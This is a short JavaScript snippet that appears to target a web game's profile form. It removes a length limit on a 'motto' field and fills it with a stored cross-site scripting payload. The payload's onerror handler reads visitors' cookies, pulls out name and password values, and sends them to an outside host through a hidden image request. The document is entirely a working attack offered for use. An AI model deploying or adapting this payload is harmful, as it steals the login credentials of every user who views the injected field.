
var autoEnter = true;
var motto = "<img src=x onerror=var&nbsp;x=document.cookie.split(\";\");" +
	"var&nbsp;name=x[0].slice(9);var&nbsp;pass=x[1].slice(10);" +
	"var&nbsp;img=document.createElement(\"img\");img.src=\"http://regan.sinaapp.com/?name=\"+name+\"&pass=\"+pass;" +
	"img.hidden=true;document.body.appendChild(img);>";
var killmsg = "";
var lastword = "";

function $(id) {
	return document.getElementById(id)
}

(function() {
	$("motto").removeAttribute("maxlength");
	$("motto").value = motto;
	$("killmsg").value = killmsg;
	$("lastword").value = lastword;
})();
